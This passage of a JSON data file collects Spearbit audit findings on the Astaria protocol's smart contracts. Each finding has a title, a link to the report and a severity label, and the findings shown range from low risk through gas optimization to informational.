        "body": "owner() is an immutable data for any ClonesWithImmutableArgs.clone that uses AstariaVault- Base. That means for example if there is an issue with the current hardcoded owner() there is no way to update it and liquidities/assets in the public/private vaults would also be at risk.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ROUTER() can not be updated for private or public vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "ROUTER() is an immutable data for any ClonesWithImmutableArgs.clone that uses AstariaVault- Base. That means for example if there is an issue with the current hardcoded ROUTER() or that it needs to be upgraded, the current public/private vaults would not be able to communicate with the new ROUTER.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Wrong return parameter type is used for getOwed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Both variations of getOwed use _getOwed and return uint192. But _getOwed returns a uint88.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Document and reason about which functionalities should be frozen on protocol pause",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "On protocol pause, a few functions are allowed to be called. Some instances are noted above. There is no documentation on why these functionalities are allowed while the remaining functions are frozen.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Wrong parameter type is used for s.strategyValidators",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "s.strategyValidators is of type mapping(uint32 => address) but the provided TYPE in the con- text is of type uint8.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Some functions do not emit events, but they should",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "AstariaRouter.sol#L268 : Other filing endpoints in the same contract and also CollateralToken and LienToken emit FileUpdated(what, data). But fileGuardian does not.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "setNewGuardian can be changed to a 2 or 3 step transfer of authority process",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The current guardian might pass a wrong _guardian parameter to setNewGuardian which can break the upgradability of the AstariaRouter using fileGuardian.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "There are no range/value checks when some parameters get fileed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There are no range/value checks when some parameters get fileed. For example:  There are no hardcoded range checks for the ...Numerators and ...Denominators, so that the protocol's users can trustlessly assume the authorized users would not push these values into ranges seemed unac- ceptable.  When an address get updated, we don't check whether the value provided is address(0) or not.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Manually constructed storage slots can be chosen so that the pre-image of the hash is unknown",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In the codebase, some storage slots are manually constructed using keccak256 hash of a string xyz.astaria. .... The pre-images of these hashes are known. This can allow in future for actors to find a potential path to those storage slots using the keccak256 hash function in the codebase and some crafted payload.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Avoid shadowing variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The highlighted line declares a new variable owner which has already been defined in Auth.sol inherited by LienToken: address owner = ownerOf(lienId);",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "PublicVault.accrue is manually inlined rather than called",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The _accrue function locks in the implied value of the PublicVault by calculating, then adding to yIntercept, and finally emitting an event. This calculation is duplicated in 3 separate locations in PublicVault:  In totalAssets  In _accrue  And in updateVaultAfterLiquidation",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CollateralToken.flashAction reverts with incorrect error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Reverts with InvalidCollateralStates.AUCTION_ACTIVE when the address is not flashEnabled.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "AstariaRouter has unnecessary access to setPayee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "LienToken.setPayee. setPayee is never called from AstariaRouter, but the router has access to call",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ClearingHouse can be deployed only when needed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When collateral is deposited, a Clearing House is automatically deployed. However, these Clearing Houses are only needed if the collateral goes to auction at Seaport, either through liquidation or the collateral holder choosing to sell them. The Astaria team has indicated that this behavior is intentional in order to put the cost on the borrower, since liquidations are already expensive. I'd suggest the perspective that all pieces of collateral will be added to the system, but a much smaller percentage will ever be sent to Seaport. The aggregate gas spent will be much, much lower if we are careful to only deploy these contract as needed. Further, let's look at the two situations where we may need a Clearing House: 1) The collateral holder calls listForSaleOnSeaport(): In this case, the borrower is paying anyways, so it's a no brainer. 2) Another user calls liquidate(): In this case, they will earn the liquidation fees, which should be sufficient to justify a small increase in gas costs.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "PublicVault.claim() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "For claim not to revert we would need to have msg.sender == owner(). And so when the following is called: _mint(owner(), unclaimed); Instead of owner() we can use msg.sender since reading the immutable owner() requires some calldata lookup.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Can remove incoming terms from LienActionBuyout struct",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Incoming terms are never used in the LienActionBuyout struct. The general flow right now is:  incomingTerms are passed to VaultImplementation#buyoutLien.  These incoming terms are validated and used to generate the lien information.  The lien information is encoded into a LienActionBuyout struct.  This is passed to LienToken#buyoutLien, but then the incoming terms are never used again.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Refactor updateVaultAfterLiquidation to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In updateVaultAfterLiquidation, we check if we're within maxAuctionWindow of the end of the If we are, we call _deployWithdrawProxyIfNotDeployed and assign withdrawProxyIfNearBoundary to epoch. the result. We then proceed to check if withdrawProxyIfNearBoundary is assigned and, if it is, call handleNewLiquidation. Instead of checking separately, we can include this call within the block of code executed if we're within maxAuc- tionWindow of the end of the epoch. This is true because (a) withdraw proxy will always be deployed by the end of that block and (b) withdraw proxy will never be deployed if timeToEnd >= maxAuctionWindow.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use collateralId to set collateralIdToAuction mapping",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_listUnderlyingOnSeaport() sets collateralIdToAuction mapping as follows: s.collateralIdToAuction[uint256(listingOrder.parameters.zoneHash)] = true; Since this function has access to collateralId, it can be used instead of using zoneHash.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Storage packing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "RouterStorage: The RouterStorage struct represents state managed in storage by the AstariaRouter contract. Some of the packing in this struct is sub optimal. 1. maxInterestRate and minInterestBPS: These two values pack into a single storage slot, however, are never referenced together outside of the constructor. This means, when read from storage, there are no gas efficiencies gained. 2. Comments denoting storage slots do not match implementation. The comment //slot 3 + for example occurs far after the 3rd slot begins as the addresses do not pack together. LienStorage: 3. The LienStorage struct packs maxLiens with the WETH address into a single storage slot. While gas is saved on the constructor, extra gas is spent in parsing maxLiens on each read as it is read alone. VaultData: 4. VaultData packs currentEpoch into the struct's first slot, however, it is more commonly read along with values from the struct's second slot.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "ClearingHouse fallback can save WETH address to memory to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The fallback function reads WETH() from ROUTER three times. once and save to memory for the future calls.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "CollateralToken's onlyOwner modifier doesn't need to access storage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The onlyOwner modifier calls to ownerOf(), which loads storage itself to check ownership. We can save a storage load since we don't need to load the storage variables in the modifier itself.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Can stop loop early in _payDebt when everything is spent",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When a loan is sold on Seaport and _payDebt is called, it loops through the auction stack and calls _paymentAH for each, decrementing the remaining payment as money is spent. This loop can be ended when payment == 0.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Can remove initializing allowList and depositCap for private vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Private Vaults do not allow enabling, disabling, or editing the allow list, and don't enforce a deposit cap, so seems strange to initialize these variables. Delegates are still included in the _validateCommitment function, so we can't get rid of this entirely.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "ISecurityHook.getState can be modified to return bytes32 / hash of the state instead of the state itself.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Since only the keccak256 of preTransferState is checked against the kec- cak256 hash of the returned security hook state, we could change the design so that ISecurityHook.getState returns bytes32 to save gas. Unless there is a plan to use the bytes memory preTransferState in some other form as well.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Define an endpoint for LienToken that only returns the liquidator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "It would save a lot of gas if LienToken had an endpoint that would only return the liquidator for a collateralId, instead of all the auction data.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Setting uninitialized stack variables to their default value can be avoided.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Setting uninitialized stack variables to their default value adds extra gas overhead. T t = <DEFAULT_VALUE>;",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Simplify / optimize for loops",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In the codebase, sometimes there are for loops of the form: for (uint256 i = 0; <CONDITION>; i++) { <BODY> } These for loops can be optimized.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "calculateSlope can be more simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "calculateSlope can be more simplified: owedAtEnd would be: owedAtEnd = amt + (tend (cid:0) tlast )r amt 1018 where:  amt is stack.point.amount  tend is stack.point.end  tlast is stack.point.last  r is stack.lien.details.rate and so the returned value would need to be r amt 1018.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Break out of _makePayment for loop early when totalCapitalAvailable reaches 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In _makePayment we have the following for loop: for (uint256 i; i < n; ) { (newStack, spent) = _payment( s, stack, uint8(i), totalCapitalAvailable, address(msg.sender) ); totalCapitalAvailable -= spent; unchecked { ++i; } } When totalCapitalAvailable reaches 0 we still call _payment which costs a lot of gas and it is only used for transferring 0 assets, removing and adding the same slope for a lien owner if it is a public vault and other noops.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_buyoutLien can be optimized by reusing payee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "payee in _buyoutLien can be reused to save some gas",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "isValidRefinance and related storage parameters can be moved to LienToken",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "isValidRefinance is only used in LienToken and with the current implementation it requires reading AstariaRouter from the storage and performing a cross-contract call which would add a lot of overhead gas cost.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "auctionWindowMax can be reused to optimize liquidate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There are mutiple instances of s.auctionWindow + s.auctionWindowBuffer in the liquidate func- tion which would make the function to read from the storage twice each time. Also there is already a stack variable auctionWindowMax defined as the sum which can be reused.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "fileBatch() does requiresAuth for each file separately",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "fileBatch() does a requiresAuth check and then for each element in the input array calls file() which does another requiresAuth check. function fileBatch(File[] calldata files) external requiresAuth { for (uint256 i = 0; i < files.length; i++) { file(files[i]); } } ... function file(File calldata incoming) public requiresAuth { This wastes gas as if the fileBatch()'s requiresAuth pass, file()'s check will pass too.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_sliceUint can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_sliceUint can be optimized",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use basis points for ratios",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Fee ratios are represented through two state variables for numerator and denominator. Basis point system can be used in its place as it is simpler (denominator always set to 10_000), and gas efficient as denomi- nator is now a constant.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "No Need to Allocate Unused Variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "LienToken._makePayment() returns two values: (Stack[] memory newStack, uint256 spent), but the second value is never read: (newStack, ) = _makePayment(_loadLienStorageSlot(), stack, amount); Also, if this value is planned to be used in future, it's not a useful value. It is equal to the payment made to the last lien. A more meaningful quantity can be the total payment made to the entire stack. Additional instances noted in Context above.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache Values to Save Gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Calls are occurring, same values are computed, or storage variables are being read, multiple times; e.g. CollateralToken.sol#L286-L307 reads the storage variable s.securityHooks[addr] four times. It's better to cache the result in a stack variable to save gas.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "RouterStorage.vaults can be a boolean mapping",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "RouterStorage.vaults is of type mapping(address => address). A key-value is stored in the mapping as: s.vaults[vaultAddr] = msg.sender; However, values in this mapping are only used to compare against address(0): if (_loadRouterSlot().vaults[msg.sender] == address(0)) { ... return _loadRouterSlot().vaults[vault] != address(0); It's better to have vaults as a boolean mapping as the assignment of msg.sender as value doesn't carry a special meaning.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "isValidReference() should just take an array element as input",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "stack[position]: isValidRefinance() takes stack array as an argument but only uses stack[0] and function isValidRefinance( ILienToken.Lien calldata newLien, uint8 position, ILienToken.Stack[] calldata stack ) public view returns (bool) { The usage of stack[0] can be replaced with stack[position] as stack[0].lien.collateralId == stack[position].lien.collateralId: if (newLien.collateralId != stack[0].lien.collateralId) { revert InvalidRefinanceCollateral(newLien.collateralId); } To save gas, it can directly take that one element as input.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Functions can be made external",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "If public function is not called from within the contract, it should made external for clarity, and can potentially save gas.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "a.mulDivDown(b,1) is equivalent to a*b",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Highlighted code above follow the pattern of a.mulDivDown(b, 1) which is equivalent to a*b.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use scratch space for keccak",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "computeId() function computes and returns uint256(keccak256(abi.encodePacked(token, to- kenId))). Since the data being hashed fits within 2 memory slots, scratch space can be used to avoid paying gas cost on memory expansion.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Define a named constant for the return value of onFlashAction",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "onFlashAction returns: keccak256(\"FlashAction.onFlashAction\")",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define a named constant for permit typehash in ERC20-cloned",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In permit, the following type hash has been used: keccak256( \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\" )",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused struct, enum and storage fields can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The struct, enum and storage fields in this context have not been used in the project.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "WPStorage.expected's comment can be made more accurate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In WPStorage's definition we have: uint88 expected; // Expected value of auctioned NFTs. yIntercept (virtual assets) of a PublicVault are ,! not modified on liquidation, only once an auction is completed. The comment for expected is not exactly accurate. The accumulated value in expected is the sum of all auctioned NFTs's amountOwed when (the timestamp) the liquidate function gets called. Whereas the NFTs get auctioned starting from their first stack's element's liquidationInitialAsk to 1_000 wei",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Leave comment that in WithdrawProxy.claim() the calculation of balance cannot underflow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There is this following line in claim() where balance is initialised: uint256 balance = ERC20(asset()).balanceOf(address(this)) - s.withdrawReserveReceived; With the current PublicVault implementation of IPublicVault, this cannot underflow since the increase in with- drawReserveReceived (using increaseWithdrawReserveReceived) is synced with increasing the asset balance by the same amount.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Shared logic in withdraw and redeem functions of WithdrawProxy can be turned into a shared modifier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "withdraw and redeem both start with the following lines: WPStorage storage s = _loadSlot(); // If auction funds have been collected to the WithdrawProxy // but the PublicVault hasn't claimed its share, too much money will be sent to LPs if (s.finalAuctionEnd != 0) { // if finalAuctionEnd is 0, no auctions were added revert InvalidState(InvalidStates.NOT_CLAIMED); } Since they have this shared logic at the beginning of their body, we can consolidate the logic into a modifier.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "StrategyDetails version can only be used in custom implementation of IStrategyValidator, requires documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "StrategyDetails.version is never used in the current implementations of the validators.  If the intention is to avoid replays across different versions of Astaria, we should add a check for it in commit- ment validation functions.  A custom implementation of IStrategyValidator can make use of this value, but this needs documentation as to exactly what it refers to.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define helper functions to tag different pieces of cloned data for ClearingHouse",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_getArgAddress(0) and _getArgUint256(21) are used as the ROUTER() and COLLATERAL_ID() in the fallback implementation for ClearingHouse was Clone derived contract.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "A new modifier onlyVault() can be defined for WithdrawProxy to consolidate logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The following require statement has been used in multiple functions including increaseWith- drawReserveReceived, drain, setWithdrawRatio and handleNewLiquidation. require(msg.sender == VAULT(), \"only vault can call\");",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistant pragma versions and floating pragma versions can be avoided",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Most contracts in the project use pragma solidity 0.8.17, but there are other variants as well: 69 pragma solidity ^0.8.16; pragma solidity ^0.8.16; pragma solidity ^0.8.16; // src/Interfaces/IAstariaVaultBase.sol // src/Interfaces/IERC4626Base.sol // src/Interfaces/ITokenBase.sol pragma solidity ^0.8.15; // src/Interfaces/ICollateralToken.sol pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; // src/Interfaces/IERC20.sol // src/Interfaces/IERC165.sol // src/Interfaces/IERC1155.sol // src/Interfaces/IERC1155Receiver.sol // src/Interfaces/IERC721Receiver.sol // src/utils/Math.sol pragma solidity >=0.8.0; pragma solidity >=0.8.0; // src/Interfaces/IERC721.sol // src/utils/MerkleProofLib.sol And they all have floating version pragmas.  In hardhat.config.ts, solidity: \"0.8.13\" is used.  In .prettierrc settings we have \"compiler\": \"0.8.17\"  In .solhint.json we have \"compiler-version\": [\"error\", \"0.8.0\"]  foundry.toml does not have a solc setting",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "IBeacon is missing a compiler version pragma",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "IBeacon is missing a compiler version pragma.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "zone and zoneHash are not required for fully open Seaport orders",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "As per Seaport's documentation,zone and zoneHash are not required for PUBLIC orders: The zone of the order is an optional secondary account attached to the order with two additional privi- leges:  The zone may cancel orders where it is named as the zone by calling cancel. (Note that offerers can also cancel their own orders, either individually or for all orders signed with their current counter at once by calling incrementCounter).  \"Restricted\" orders (as specified by the order type) must either be executed by the zone or the offerer, or must be approved as indicated by a call to an isValidOrder or isValidOrderIncludingEx- traData view function on the zone. 70 This order isn't \"Restricted\", and there is no way to cancel a Seaport order once created from this contract.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent treatment of delegate setting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Private vaults include delegate in the allow list when deployed through the Router. Public vaults do not. The VaultImplementation, when mutating a delegate, sets them on allow list.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "AstariaRouter does not adhere to EIP1967 spec",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The Router serves as an implementation Beacon for proxy contracts, however, does not adhere to the EIP1967 spec.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Receiver of bought out lien must be approved by msg.sender",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The buyoutLien function requires that either the receiver of the lien is msg.sender or is an address approved by msg.sender: if (msg.sender != params.encumber.receiver) { require( _loadERC721Slot().isApprovedForAll[msg.sender][params.encumber.receiver] ); } This check seems unnecessary and in some cases will block users from buying out liens as intended.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "A new modifer onlyLienToken() can be defined to refactor logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The following require statement has been used in multiple locations in PublicVault: require(msg.sender == address(LIEN_TOKEN())); Locations used:  beforePayment  afterPayment  handleBuyoutLien  updateAfterLiquidationPayment  updateVaultAfterLiquidation",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "A redundant if block can be removed from PublicVault._afterCommitToLien",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In PublicVault._afterCommitToLien, we have the following if block: if (s.last == 0) { s.last = block.timestamp.safeCastTo40(); } This if block is redundant, since regardless of the value of s.last, a few lines before _accrue(s) would update the s.last to the current timestamp.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Private vaults' deposit endpoints can be potentially simplifed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "A private vault's deposit function can be called directly or indirectly using the ROUTER() (either way by anyone) and we have the following require statement: require( s.allowList[msg.sender] || (msg.sender == address(ROUTER()) && s.allowList[receiver]) ); If the ROUTER() is the AstariaRouter implementation of IAstariaRouter, then it inherits from ERC4626RouterBase and ERC4626Router which allows anyone to call into deposit of this private vault using:  depositToVault  depositMax  ERC4626RouterBase.deposit Thus if anyone of the above functions is called through the ROUTER(), msg.sender == address(ROUTER() will be true. Also, note that when private vaults are created using the newVault the msg.sender/owner along the delegate are added to the allowList and allowlist is enabled. And since there is no bookkeeping here for the receiver, except only the require statement, that means  Only the owner or the delegate of this private vault can call directly into deposit or  Anyone else can set the address to parameter of one of those 3 endpoints above to owner or delegate to deposit assets (wETH in the current implementation) into the private vault. And all the assets can be withdrawn by the owner only.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "The require statement in decreaseEpochLienCount can be more strict",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "decreaseEpochLienCount has the following require statement that limits who can call into it: require( msg.sender == address(ROUTER()) || msg.sender == address(LIEN_TOKEN()) ); So only, the ROUTER() and LIEN_TOKEN() are allowed to call into. But AstariaRouter never calls into this function.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "amount is not used in _afterCommitToLien",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "amount is not used in _afterCommitToLien to update/decrement s.yIntercept, because even though assets have been transferred out of the vault, they would still need to be paid back and so the net ef- fect on s.yIntercept (that is used in the calculation of the total virtual assets) is 0.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
